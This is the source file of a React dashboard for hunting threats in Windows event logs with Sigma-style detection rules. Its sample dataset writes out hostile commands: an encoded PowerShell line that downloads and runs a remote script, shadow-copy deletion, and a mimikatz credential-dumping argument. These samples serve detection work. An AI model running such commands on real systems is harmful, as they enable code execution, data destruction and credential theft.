import React, { useState, useMemo, useRef } from 'react';
import { 
  ShieldAlert, AlertTriangle, Search, Terminal, 
  Layers, Clock, Copy, Check, Filter, ShieldCheck, 
  Flame, CheckCircle2, ChevronRight, FileCode, UserCheck, Upload, RefreshCw, Sparkles
} from 'lucide-react';

export interface WindowsEventLogRecord {
  recordId: number;
  eventId: number;
  provider: string;
  channel: string;
  timestamp: string;
  computer: string;
  user: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'INFO';
  title: string;
  description: string;
  mitreTechnique: string;
  sigmaRuleMatched?: string;
  eventData: Record<string, string>;
}

export interface SigmaRuleDef {
  id: string;
  title: string;
  status: 'STABLE';
  mitre: string;
  description: string;
  detectionCondition: string;
  checkFn: (event: WindowsEventLogRecord) => boolean;
}

export const SIGMA_RULES: SigmaRuleDef[] = [
  {
    id: 'sigma-win-001',
    title: 'Encoded PowerShell Command Execution',
    status: 'STABLE',
    mitre: 'T1059.001 (Command and Scripting Interpreter: PowerShell)',
    description: 'Detects execution of powershell.exe with -enc, -encodedcommand, or -e flags often used to conceal malicious payload scripts.',
    detectionCondition: 'CommandLine contains [" -enc ", " -encodedcommand ", " -e "]',
    checkFn: (e) => {
      const cmd = (e.eventData.CommandLine || e.description || '').toLowerCase();
      return (e.eventId === 4688 || e.eventId === 1) && (cmd.includes(' -enc ') || cmd.includes(' -encodedcommand ') || cmd.includes(' -e '));
    },
  },
  {
    id: 'sigma-win-002',
    title: 'Volume Shadow Copy Deletion via Vssadmin',
    status: 'STABLE',
    mitre: 'T1490 (Inhibit System Recovery)',
    description: 'Detects execution of vssadmin or wmic commands intended to purge volume shadow copies prior to ransomware encryption.',
    detectionCondition: 'Image endswith "vssadmin.exe" AND CommandLine contains "delete shadows"',
    checkFn: (e) => {
      const cmd = (e.eventData.CommandLine || e.description || '').toLowerCase();
      return cmd.includes('vssadmin') && cmd.includes('delete') && cmd.includes('shadow');
    },
  },
  {
    id: 'sigma-win-003',
    title: 'Security Audit Log Cleared (Anti-Forensics)',
    status: 'STABLE',
    mitre: 'T1070.001 (Indicator Removal: Clear Windows Event Logs)',
    description: 'Detects Event ID 1102 or 104 signifying that the security log was intentionally cleared by a local administrator or malware.',
    detectionCondition: 'EventID in [1102, 104]',
    checkFn: (e) => e.eventId === 1102 || e.eventId === 104,
  },
  {
    id: 'sigma-win-004',
    title: 'Suspicious Service Installation in Non-Standard Path',
    status: 'STABLE',
    mitre: 'T1543.003 (Create or Modify System Process: Windows Service)',
    description: 'Detects Event 7045 where binary path is located in %TEMP%, C:\Users\Public, or AppData directory.',
    detectionCondition: 'ImagePath contains ["\\Users\\Public\\", "\\AppData\\", "\\Temp\\"]',
    checkFn: (e) => {
      if (e.eventId !== 7045) return false;
      const path = (e.eventData.ImagePath || e.description || '').toLowerCase();
      return path.includes('\\users\\public\\') || path.includes('\\appdata\\') || path.includes('\\temp\\');
    },
  },
  {
    id: 'sigma-win-005',
    title: 'Suspicious LOLBin Ingress via Certutil',
    status: 'STABLE',
    mitre: 'T1105 (Ingress Tool Transfer)',
    description: 'Detects certutil.exe invoked with -urlcache or -split flags to download remote staging binaries.',
    detectionCondition: 'Image endswith "certutil.exe" AND CommandLine contains "-urlcache"',
    checkFn: (e) => {
      const cmd = (e.eventData.CommandLine || e.description || '').toLowerCase();
      return cmd.includes('certutil') && (cmd.includes('-urlcache') || cmd.includes('/urlcache'));
    },
  },
];

// SANS DFIR Benchmark Scenario Dataset
export const BENCHMARK_EVTX_LOGS: WindowsEventLogRecord[] = [
  {
    recordId: 48912,
    eventId: 1102,
    provider: 'Microsoft-Windows-Security-Auditing',
    channel: 'Security',
    timestamp: '2026-09-11 13:58:02 UTC',
    computer: 'CORP-DC01.corp.internal',
    user: 'CORP\\admin_temp',
    severity: 'CRITICAL',
    title: 'The audit log was cleared',
    description: 'The security event audit log was wiped. This action is typical of advanced threat actors attempting to eradicate incident response traces.',
    mitreTechnique: 'T1070.001 (Clear Windows Event Logs)',
    sigmaRuleMatched: 'sigma-win-003 (Security Audit Log Cleared)',
    eventData: {
      SubjectUserSid: 'S-1-5-21-28491024-918239-1002',
      SubjectUserName: 'admin_temp',
      SubjectDomainName: 'CORP',
      SubjectLogonId: '0x3e7',
    },
  },
  {
    recordId: 48911,
    eventId: 4688,
    provider: 'Microsoft-Windows-Security-Auditing',
    channel: 'Security',
    timestamp: '2026-09-11 13:54:19 UTC',
    computer: 'CORP-DC01.corp.internal',
    user: 'NT AUTHORITY\\SYSTEM',
    severity: 'CRITICAL',
    title: 'A new process has been created: vssadmin.exe',
    description: 'Command line execution attempting to purge shadow copy snapshots before encrypting network volumes.',
    mitreTechnique: 'T1490 (Inhibit System Recovery)',
    sigmaRuleMatched: 'sigma-win-002 (Volume Shadow Copy Deletion via Vssadmin)',
    eventData: {
      NewProcessName: 'C:\\Windows\\System32\\vssadmin.exe',
      CommandLine: 'vssadmin.exe delete shadows /all /quiet',
      ParentProcessName: 'C:\\Windows\\System32\\cmd.exe',
      SubjectUserName: 'SYSTEM',
    },
  },
  {
    recordId: 48910,
    eventId: 4688,
    provider: 'Microsoft-Windows-Security-Auditing',
    channel: 'Security',
    timestamp: '2026-09-11 13:49:05 UTC',
    computer: 'CORP-DC01.corp.internal',
    user: 'CORP\\contractor_svc',
    severity: 'HIGH',
    title: 'A new process has been created: powershell.exe',
    description: 'Base64 encoded PowerShell staging command executed via contractor account.',
    mitreTechnique: 'T1059.001 (Command and Scripting: PowerShell)',
    sigmaRuleMatched: 'sigma-win-001 (Encoded PowerShell Command Execution)',
    eventData: {
      NewProcessName: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      CommandLine: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4ANAAyAC8AYgAuAHAAcwAxACIAKQAA',
      ParentProcessName: 'C:\\Windows\\System32\\svchost.exe',
      SubjectUserName: 'contractor_svc',
    },
  },
  {
    recordId: 48909,
    eventId: 7045,
    provider: 'Service Control Manager',
    channel: 'System',
    timestamp: '2026-09-11 13:42:11 UTC',
    computer: 'CORP-DC01.corp.internal',
    user: 'NT AUTHORITY\\SYSTEM',
    severity: 'HIGH',
    title: 'A service was installed in the system',
    description: 'Persistence established by registering a new Windows Service with an executable located in the public user directory.',
    mitreTechnique: 'T1543.003 (Create or Modify System Process: Windows Service)',
    sigmaRuleMatched: 'sigma-win-004 (Suspicious Service Installation in Non-Standard Path)',
    eventData: {
      ServiceName: 'WindowsPrintSpoolerService',
      ImagePath: 'C:\\Users\\Public\\spoolsv.exe sekurlsa::logonpasswords',
      ServiceType: 'user mode service',
      StartType: 'auto start',
      AccountName: 'LocalSystem',
    },
  },
];

// Genuine XML / JSON Ingestor for Windows Event Logs
function parseWindowsEventLogPayload(rawText: string): WindowsEventLogRecord[] {
  const records: WindowsEventLogRecord[] = [];

  // Try parsing as XML
  if (rawText.includes('<Event') || rawText.includes('<event')) {
    try {
      const parser = new DOMParser();
      const xmlDoc = parser.parseFromString(rawText, 'text/xml');
      const eventNodes = xmlDoc.getElementsByTagName('Event');

      for (let i = 0; i < eventNodes.length; i++) {
        const node = eventNodes[i];
        const eventIdStr = node.getElementsByTagName('EventID')[0]?.textContent || '0';
        const eventId = parseInt(eventIdStr, 10) || 0;
        const timeStr = node.getElementsByTagName('TimeCreated')[0]?.getAttribute('SystemTime') || new Date().toISOString();
        const computer = node.getElementsByTagName('Computer')[0]?.textContent || 'LOCAL-ENDPOINT';
        const provider = node.getElementsByTagName('Provider')[0]?.getAttribute('Name') || 'Windows-Event-Audit';
        const channel = node.getElementsByTagName('Channel')[0]?.textContent || 'Security';

        const eventData: Record<string, string> = {};
        const dataNodes = node.getElementsByTagName('Data');
        for (let j = 0; j < dataNodes.length; j++) {
          const name = dataNodes[j].getAttribute('Name') || `Param_${j}`;
          eventData[name] = dataNodes[j].textContent || '';
        }

        const cmd = eventData.CommandLine || eventData.NewProcessName || eventData.ImagePath || '';
        let severity: WindowsEventLogRecord['severity'] = 'INFO';
        if (eventId === 1102 || cmd.includes('delete shadow')) severity = 'CRITICAL';
        else if (eventId === 7045 || cmd.includes(' -enc ')) severity = 'HIGH';
        else if (eventId === 4625) severity = 'MEDIUM';

        records.push({
          recordId: 10000 + i + 1,
          eventId,
          provider,
          channel,
          timestamp: timeStr.replace('T', ' ').slice(0, 19) + ' UTC',
          computer,
          user: eventData.SubjectUserName || eventData.TargetUserName || 'SYSTEM',
          severity,
          title: `Windows Event ID ${eventId}: ${provider}`,
          description: cmd ? `Execution: ${cmd}` : `Event recorded in ${channel} channel.`,
          mitreTechnique: eventId === 1102 ? 'T1070.001' : eventId === 4688 ? 'T1059' : eventId === 7045 ? 'T1543.003' : 'T1078',
          eventData,
        });
      }

      if (records.length > 0) return records;
    } catch {
      // Fallback to JSON / line parser
    }
  }

  // Try parsing as JSON array
  try {
    const parsedJson = JSON.parse(rawText);
    const arr = Array.isArray(parsedJson) ? parsedJson : [parsedJson];
    for (let i = 0; i < arr.length; i++) {
      const item = arr[i];
      const eventId = parseInt(item.Id || item.EventId || item.eventId || '0', 10);
      const cmd = item.CommandLine || item.Message || item.description || '';
      
      let severity: WindowsEventLogRecord['severity'] = 'INFO';
      if (eventId === 1102 || cmd.includes('delete shadow')) severity = 'CRITICAL';
      else if (eventId === 7045 || cmd.includes(' -enc ')) severity = 'HIGH';
      else if (eventId === 4625) severity = 'MEDIUM';

      records.push({
        recordId: 10000 + i + 1,
        eventId: eventId || 4688,
        provider: item.ProviderName || item.provider || 'Microsoft-Windows-Security-Auditing',
        channel: item.LogName || item.channel || 'Security',
        timestamp: item.TimeCreated || new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
        computer: item.MachineName || item.computer || 'LOCAL-ENDPOINT',
        user: item.UserId || item.user || 'SYSTEM',
        severity,
        title: item.Message ? item.Message.slice(0, 60) : `Event ID ${eventId}`,
        description: cmd || item.Message || 'Ingested via JSON stream',
        mitreTechnique: 'T1059',
        eventData: typeof item === 'object' ? item : {},
      });
    }
    if (records.length > 0) return records;
  } catch {
    // Fallback to line-based parsing
  }

  // Fallback: Line-by-line raw ingestion
  const lines = rawText.split('\n').filter(l => l.trim().length > 0);
  lines.forEach((line, idx) => {
    let eventId = 4688;
    if (line.includes('1102')) eventId = 1102;
    if (line.includes('7045')) eventId = 7045;
    if (line.includes('4625')) eventId = 4625;

    records.push({
      recordId: 10000 + idx + 1,
      eventId,
      provider: 'Microsoft-Windows-Security-Auditing',
      channel: 'Security',
      timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
      computer: 'LIVE-PARSER-NODE',
      user: 'INGESTED_OPERATOR',
      severity: line.toLowerCase().includes('mimikatz') || line.toLowerCase().includes('shadow') ? 'CRITICAL' : 'MEDIUM',
      title: `Log Line #${idx + 1}`,
      description: line,
      mitreTechnique: 'T1059',
      eventData: { RawLogLine: line },
    });
  });

  return records;
}

export const EvtxThreatHunter: React.FC = () => {
  const [logs, setLogs] = useState<WindowsEventLogRecord[]>(BENCHMARK_EVTX_LOGS);
  const [isRealUploadedFile, setIsRealUploadedFile] = useState(false);
  const [selectedRecord, setSelectedRecord] = useState<WindowsEventLogRecord>(BENCHMARK_EVTX_LOGS[0]);
  const [severityFilter, setSeverityFilter] = useState<string>('ALL');
  const [eventIdFilter, setEventIdFilter] = useState<string>('ALL');
  const [searchFilter, setSearchFilter] = useState<string>('');
  const [showIngestModal, setShowIngestModal] = useState<boolean>(false);
  const [rawLogInput, setRawLogInput] = useState<string>('');
  const [copiedText, setCopiedText] = useState<boolean>(false);
  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Evaluate Sigma Rules dynamically on all current logs
  const annotatedLogs = useMemo(() => {
    return logs.map(log => {
      let matchedRule: string | undefined = log.sigmaRuleMatched;
      for (const rule of SIGMA_RULES) {
        if (rule.checkFn(log)) {
          matchedRule = `${rule.id} (${rule.title})`;
          break;
        }
      }
      return { ...log, sigmaRuleMatched: matchedRule };
    });
  }, [logs]);

  const filteredLogs = useMemo(() => {
    return annotatedLogs.filter(log => {
      if (severityFilter !== 'ALL' && log.severity !== severityFilter) return false;
      if (eventIdFilter !== 'ALL' && log.eventId.toString() !== eventIdFilter) return false;
      if (!searchFilter.trim()) return true;
      const q = searchFilter.toLowerCase();
      return (
        log.computer.toLowerCase().includes(q) ||
        log.user.toLowerCase().includes(q) ||
        log.title.toLowerCase().includes(q) ||
        log.eventId.toString().includes(q) ||
        log.description.toLowerCase().includes(q) ||
        (log.sigmaRuleMatched && log.sigmaRuleMatched.toLowerCase().includes(q))
      );
    });
  }, [annotatedLogs, severityFilter, eventIdFilter, searchFilter]);

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(true);
    setTimeout(() => setCopiedText(false), 2000);
  };

  const handleProcessRawInput = () => {
    if (!rawLogInput.trim()) return;
    const parsed = parseWindowsEventLogPayload(rawLogInput);
    if (parsed.length > 0) {
      setLogs(parsed);
      setSelectedRecord(parsed[0]);
      setIsRealUploadedFile(true);
      setShowIngestModal(false);
      setRawLogInput('');
    } else {
      alert('Unable to parse event logs from input. Please provide valid XML, JSON, or text log records.');
    }
  };

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    try {
      const text = await file.text();
      const parsed = parseWindowsEventLogPayload(text);
      if (parsed.length > 0) {
        setLogs(parsed);
        setSelectedRecord(parsed[0]);
        setIsRealUploadedFile(true);
      } else {
        alert('No parseable Windows event records found in file.');
      }
    } catch (err: any) {
      alert(`File read failed: ${err?.message || 'Unknown error'}`);
    }
  };

  return (
    <div className="flex flex-col h-full w-full bg-black text-neutral-100 font-mono select-none overflow-hidden">
      {/* Top Threat Hunting Banner */}
      <div className="p-3 bg-neutral-950 border-b border-neutral-800 flex flex-wrap items-center justify-between gap-3 shrink-0">
        <div className="flex items-center gap-3">
          <div className="p-2 bg-neutral-900 border border-neutral-700 text-rose-400">
            <ShieldAlert className="w-4 h-4" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-xs font-bold uppercase tracking-wider text-neutral-100">
                WINDOWS EVENT LOG (EVTX) THREAT HUNTER & SIGMA RULE ENGINE
              </span>
              <span className={`px-1.5 py-0.2 text-[9px] border ${
                isRealUploadedFile 
                  ? 'bg-emerald-950/80 border-emerald-600 text-emerald-300' 
                  : 'bg-neutral-800 border-neutral-600 text-neutral-400'
              }`}>
                {isRealUploadedFile ? '● LIVE LOGS INGESTED' : 'CALIBRATION BENCHMARK'}
              </span>
            </div>
            <div className="text-[10px] text-neutral-400 flex items-center gap-2">
              <span>EVENTS: {logs.length}</span>
              <span>•</span>
              <span className="text-rose-400 font-bold">
                SIGMA ALERTS: {annotatedLogs.filter(l => l.sigmaRuleMatched).length}
              </span>
              <span>•</span>
              <span className="text-cyan-400">RULES LOADED: {SIGMA_RULES.length}</span>
            </div>
          </div>
        </div>

        {/* Action Controls */}
        <div className="flex items-center gap-2">
          <input
            type="file"
            ref={fileInputRef}
            onChange={handleFileUpload}
            accept=".xml,.json,.csv,.txt,.log"
            className="hidden"
          />

          <button
            onClick={() => fileInputRef.current?.click()}
            className="px-3 py-1 bg-rose-600 hover:bg-rose-500 text-black font-bold text-xs flex items-center gap-1.5 transition-all cursor-pointer shadow-lg shadow-rose-950/50"
          >
            <Upload className="w-3.5 h-3.5" />
            <span>UPLOAD REAL LOGS</span>
          </button>

          <button
            onClick={() => setShowIngestModal(true)}
            className="px-2.5 py-1 bg-neutral-900 hover:bg-neutral-800 border border-neutral-700 text-neutral-300 font-bold text-xs flex items-center gap-1.5 transition-all cursor-pointer"
          >
            <FileCode className="w-3.5 h-3.5 text-amber-400" />
            <span>PASTE LOG / XML</span>
          </button>

          {isRealUploadedFile && (
            <button
              onClick={() => {
                setLogs(BENCHMARK_EVTX_LOGS);
                setSelectedRecord(BENCHMARK_EVTX_LOGS[0]);
                setIsRealUploadedFile(false);
              }}
              className="px-2 py-1 bg-neutral-900 hover:bg-neutral-800 border border-neutral-800 text-neutral-500 hover:text-white text-[10px] cursor-pointer"
            >
              Reset Benchmark
            </button>
          )}
        </div>
      </div>

      {/* Filter & Controls Bar */}
      <div className="p-2.5 bg-neutral-950 border-b border-neutral-800 flex flex-wrap items-center justify-between gap-2 text-xs shrink-0">
        <div className="flex items-center gap-2">
          <div className="relative">
            <Search className="w-3.5 h-3.5 text-neutral-500 absolute left-2.5 top-1/2 -translate-y-1/2" />
            <input
              type="text"
              value={searchFilter}
              onChange={(e) => setSearchFilter(e.target.value)}
              placeholder="Search computer, user, LOLBin cmd..."
              className="pl-8 pr-3 py-1 bg-black border border-neutral-800 text-white placeholder-neutral-600 text-xs w-64 focus:border-rose-500 focus:outline-none"
            />
          </div>

          <div className="flex items-center gap-1">
            {['ALL', 'CRITICAL', 'HIGH', 'MEDIUM', 'INFO'].map((sev) => (
              <button
                key={sev}
                onClick={() => setSeverityFilter(sev)}
                className={`px-2 py-0.5 text-[10px] font-bold border transition-colors cursor-pointer ${
                  severityFilter === sev
                    ? 'bg-neutral-900 text-white border-neutral-600'
                    : 'bg-black text-neutral-500 border-neutral-900 hover:text-neutral-300'
                }`}
              >
                {sev}
              </button>
            ))}
          </div>
        </div>

        <div className="flex items-center gap-1">
          <span className="text-[10px] text-neutral-500">EVENT ID:</span>
          {['ALL', '4688', '1102', '7045', '4624', '4625'].map((id) => (
            <button
              key={id}
              onClick={() => setEventIdFilter(id)}
              className={`px-2 py-0.5 text-[10px] font-mono border transition-colors cursor-pointer ${
                eventIdFilter === id
                  ? 'bg-rose-950 text-rose-300 border-rose-700'
                  : 'bg-black text-neutral-500 border-neutral-900 hover:text-neutral-300'
              }`}
            >
              {id}
            </button>
          ))}
        </div>
      </div>

      {/* Main Grid: Left Event Table (7 cols) + Right Sigma Telemetry (5 cols) */}
      <div className="flex-1 grid grid-cols-1 lg:grid-cols-12 overflow-hidden">
        {/* Left Column: Event List Table */}
        <div className="lg:col-span-7 border-r border-neutral-800 overflow-y-auto">
          <table className="w-full text-left border-collapse text-xs">
            <thead className="bg-neutral-950 text-neutral-400 border-b border-neutral-800 sticky top-0 z-10 text-[10px]">
              <tr>
                <th className="py-2 px-3 w-16">ID</th>
                <th className="py-2 px-3 w-28">TIMESTAMP</th>
                <th className="py-2 px-3 w-28">COMPUTER</th>
                <th className="py-2 px-3 w-24">USER</th>
                <th className="py-2 px-3">EVENT / SIGMA CORRELATION</th>
                <th className="py-2 px-3 w-20 text-right">SEV</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-neutral-900 font-mono text-[11px]">
              {filteredLogs.map((log) => {
                const isSelected = selectedRecord?.recordId === log.recordId;
                return (
                  <tr
                    key={log.recordId}
                    onClick={() => setSelectedRecord(log)}
                    className={`cursor-pointer transition-colors ${
                      isSelected
                        ? 'bg-neutral-900 text-white border-l-2 border-rose-500'
                        : log.sigmaRuleMatched
                        ? 'bg-rose-950/10 hover:bg-neutral-900/60'
                        : 'hover:bg-neutral-900/40'
                    }`}
                  >
                    <td className="py-2 px-3 text-cyan-400 font-bold font-mono">{log.eventId}</td>
                    <td className="py-2 px-3 text-neutral-400 text-[10px]">{log.timestamp.slice(11)}</td>
                    <td className="py-2 px-3 text-neutral-300 truncate max-w-[110px]">{log.computer}</td>
                    <td className="py-2 px-3 text-neutral-400 truncate max-w-[90px]">{log.user}</td>
                    <td className="py-2 px-3">
                      <div className="truncate font-medium text-neutral-200">{log.title}</div>
                      {log.sigmaRuleMatched && (
                        <div className="text-[10px] text-rose-400 font-bold truncate flex items-center gap-1 mt-0.5">
                          <Flame className="w-2.5 h-2.5 text-rose-500 shrink-0" />
                          <span>{log.sigmaRuleMatched}</span>
                        </div>
                      )}
                    </td>
                    <td className="py-2 px-3 text-right">
                      <span className={`px-1.5 py-0.2 text-[9px] font-bold border ${
                        log.severity === 'CRITICAL'
                          ? 'bg-rose-950 text-rose-300 border-rose-700'
                          : log.severity === 'HIGH'
                          ? 'bg-amber-950 text-amber-300 border-amber-700'
                          : 'bg-neutral-900 text-neutral-400 border-neutral-800'
                      }`}>
                        {log.severity}
                      </span>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>

        {/* Right Column: Selected Event Inspector & Sigma Rule Attribution */}
        <div className="lg:col-span-5 flex flex-col h-full bg-neutral-950 overflow-y-auto p-4 space-y-4">
          {selectedRecord ? (
            <>
              {/* Event Header Card */}
              <div className="p-3 bg-black border border-neutral-800 space-y-2">
                <div className="flex items-center justify-between border-b border-neutral-800 pb-1.5">
                  <div className="flex items-center gap-2">
                    <span className="text-cyan-400 font-bold text-xs">EVENT ID {selectedRecord.eventId}</span>
                    <span className="text-neutral-600">//</span>
                    <span className="text-neutral-400 text-xs">{selectedRecord.channel}</span>
                  </div>
                  <span className={`text-[9px] px-1.5 py-0.2 font-bold ${
                    selectedRecord.severity === 'CRITICAL' ? 'text-rose-400' : 'text-neutral-400'
                  }`}>
                    {selectedRecord.severity}
                  </span>
                </div>

                <div className="text-xs font-bold text-white leading-snug">
                  {selectedRecord.title}
                </div>

                <p className="text-[11px] text-neutral-400 leading-relaxed">
                  {selectedRecord.description}
                </p>

                <div className="pt-2 border-t border-neutral-800 flex justify-between text-[10px] text-neutral-500">
                  <span>TIME: {selectedRecord.timestamp}</span>
                  <span>MITRE: <strong className="text-rose-400">{selectedRecord.mitreTechnique}</strong></span>
                </div>
              </div>

              {/* Sigma Rule Match Badge */}
              {selectedRecord.sigmaRuleMatched && (
                <div className="p-3 bg-rose-950/30 border border-rose-600 text-rose-200 space-y-1">
                  <div className="flex items-center gap-2 text-xs font-bold">
                    <Flame className="w-4 h-4 text-rose-400" />
                    <span>SIGMA RULE TRIGGERED</span>
                  </div>
                  <div className="text-[11px] font-mono font-bold text-white">
                    {selectedRecord.sigmaRuleMatched}
                  </div>
                  <p className="text-[10px] text-rose-300/80 leading-relaxed">
                    Correlated against rule baseline. Indicator represents living-off-the-land adversary activity.
                  </p>
                </div>
              )}

              {/* Raw Event Data Fields */}
              <div className="border border-neutral-800 bg-black p-3 space-y-2">
                <div className="flex items-center justify-between text-[11px] font-bold text-neutral-400 border-b border-neutral-800 pb-1">
                  <span>EVENTDATA KEY-VALUE PAIRS</span>
                  <button
                    onClick={() => handleCopy(JSON.stringify(selectedRecord.eventData, null, 2))}
                    className="text-[10px] text-neutral-500 hover:text-white flex items-center gap-1 cursor-pointer"
                  >
                    {copiedText ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedText ? 'COPIED' : 'COPY JSON'}</span>
                  </button>
                </div>

                <div className="space-y-1.5 text-xs font-mono">
                  {Object.entries(selectedRecord.eventData).map(([k, v]) => (
                    <div key={k} className="p-1.5 bg-neutral-950 border border-neutral-900">
                      <div className="text-[9px] text-neutral-500">{k}</div>
                      <div className="text-neutral-200 text-[10px] break-all select-all mt-0.5">{v}</div>
                    </div>
                  ))}
                </div>
              </div>
            </>
          ) : (
            <div className="p-8 text-center text-xs text-neutral-600 border border-dashed border-neutral-800">
              Select an event record to inspect attributes.
            </div>
          )}
        </div>
      </div>

      {/* Paste / Ingest Modal */}
      {showIngestModal && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="w-full max-w-2xl bg-neutral-950 border border-neutral-700 p-4 space-y-3 shadow-2xl">
            <div className="flex items-center justify-between border-b border-neutral-800 pb-2">
              <span className="text-xs font-bold text-white flex items-center gap-2 uppercase">
                <FileCode className="w-4 h-4 text-amber-400" />
                <span>INGEST WINDOWS EVENT LOG DATA (XML / JSON / TEXT)</span>
              </span>
              <button
                onClick={() => setShowIngestModal(false)}
                className="text-neutral-500 hover:text-white text-xs cursor-pointer"
              >
                ✕
              </button>
            </div>

            <p className="text-[10px] text-neutral-400 leading-relaxed">
              Paste XML exported from Windows Event Viewer, JSON from PowerShell (`Get-WinEvent | ConvertTo-Json`), or raw log lines. The engine will parse Event IDs, command lines, and test against live Sigma detection rules.
            </p>

            <textarea
              rows={10}
              value={rawLogInput}
              onChange={(e) => setRawLogInput(e.target.value)}
              placeholder='<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"> ... </Event> or [{"EventId": 4688, "CommandLine": "vssadmin.exe delete shadows"}]'
              className="w-full p-2.5 bg-black border border-neutral-800 text-white font-mono text-xs focus:border-amber-500 focus:outline-none"
            />

            <div className="flex justify-end gap-2 pt-2 border-t border-neutral-800">
              <button
                onClick={() => setShowIngestModal(false)}
                className="px-3 py-1 bg-neutral-900 text-neutral-400 hover:text-white text-xs cursor-pointer"
              >
                Cancel
              </button>
              <button
                onClick={handleProcessRawInput}
                className="px-3 py-1 bg-amber-600 hover:bg-amber-500 text-black font-bold text-xs cursor-pointer"
              >
                PARSE & AUDIT LOGS
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
